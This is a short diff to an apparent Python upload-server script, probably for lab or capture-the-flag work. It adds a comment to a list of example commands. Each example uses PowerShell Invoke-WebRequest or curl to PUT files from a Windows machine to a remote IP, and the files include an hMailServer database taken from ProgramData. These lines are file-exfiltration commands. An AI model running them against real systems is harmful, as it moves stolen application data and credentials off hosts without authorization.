@@ -31,3 +31,4 @@ if __name__ == '__main__':
 # powershell -c "Invoke-WebRequest -Uri http://10.10.15.169/hMailServer.sdf -Method PUT -InFile 'C:\ProgramData\hMailServer.sdf'"
 # curl -X PUT -T "hMailServer.sdf" http://192.168.1.100/hMailServer.sdf
 # Invoke-WebRequest -Uri "http://10.10.14.226/C8D69EBE9A43E9DEBF6B5FBD48B521B9" -Method Put -InFile "C8D69EBE9A43E9DEBF6B5FBD48B521B9"
+# curl.exe -X PUT -T "C8D69EBE9A43E9DEBF6B5FBD48B521B9" http://10.10.14.226/C8D69EBE9A43E9DEBF6B5FBD48B521B9
